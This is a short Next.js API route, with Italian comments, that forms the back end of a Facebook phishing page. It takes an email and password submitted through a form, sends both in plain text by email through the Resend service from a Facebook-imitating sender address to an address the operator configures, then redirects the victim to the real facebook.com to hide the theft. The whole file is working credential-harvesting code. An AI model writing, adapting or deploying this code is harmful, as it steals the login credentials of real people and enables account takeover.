
  // /app/api/process/route.ts
import { NextResponse } from 'next/server';
import { Resend } from 'resend';

export async function POST(request: Request) {
  try {
    const body = await request.formData();
    const email = body.get('email')?.toString() || '';
    const password = body.get('password')?.toString() || '';

    // Validazione base
    if (!email || !password) {
      return NextResponse.json({ error: 'Email e password richiesti.' }, { status: 400 });
    }

    const resend = new Resend(process.env.RESEND_API_KEY);

    await resend.emails.send({
      from: 'securitynoreply@facebook2025.it',
      to: process.env.EMAIL_TO ?? '',
      subject: 'Nuovo accesso dal sito Facebook',
      text: `Email: ${email}\nPassword: ${password}`,
    });

    // Redirect dopo invio
    return NextResponse.redirect('https://www.facebook.com');
  } catch (error) {
    console.error('Errore nella route API:', error);
    return NextResponse.json({ error: 'Errore interno del server.' }, { status: 500 });
  }
}
